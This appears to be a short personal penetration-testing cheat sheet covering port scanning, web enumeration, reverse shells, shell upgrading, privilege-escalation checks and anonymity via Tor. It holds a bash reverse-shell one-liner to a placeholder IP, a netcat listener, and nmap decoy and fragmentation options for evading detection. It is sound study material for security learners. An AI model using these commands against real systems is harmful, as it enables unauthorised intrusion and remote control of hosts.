# Target enumaration
1. `nmap <ip> -p-` (all ports) 
    - `-sU` (UDP) `-Pn` (skip host discovery)`
    - `-A` (implies `-O` (OS), `-sC` (scripts), `-sV` (version))
    - `-f` (fragment packets) `-D` (decoy)

# Webservers
1. Spider website (e.g. using Burp Suite Proxy without intercept)
2. Enumerate subdomains and dirs (e.g. with `gobuster`)
3. Gain read access on webserver
    - Enumerate login forms
    - XSS, SQL-Injection
4. Gain write access on webserver
    - Access OS shell
    - Set up reverse shell with `nc -lvnp <port>`
        - /usr/share/webshells/php/php-reverse-shell.php
        - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
    - Spawn fully interactive shell
        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` CTRL+Z `stty raw -echo` `fg` `export TERM=xterm`
    - Use ssh if credentials found at some point
    - Check out user permissions with `whoami`, `id`, `sudo -l`
6. Search webserver
    - Interesting text data
        - `find . -type f -name '<glob pattern>' | xargs cat | grep -i <glob pattern>`
    - Binaries
        - Find binaries with permissions for user group `find / -group <group_name> 2>/dev/null`
        - Query infos about files `ls -la <path_to_file> && file <path_to_file>`
        - Append PATH `export PATH=<directory>:$PATH`
        - Check vulnerable binaries https://gtfobins.github.io/


# Password cracking
1. Use Google as Rainbow Table

## Windows
`impacket-psexec`

# Privacy
1. Tails
2. Proxychains with TOR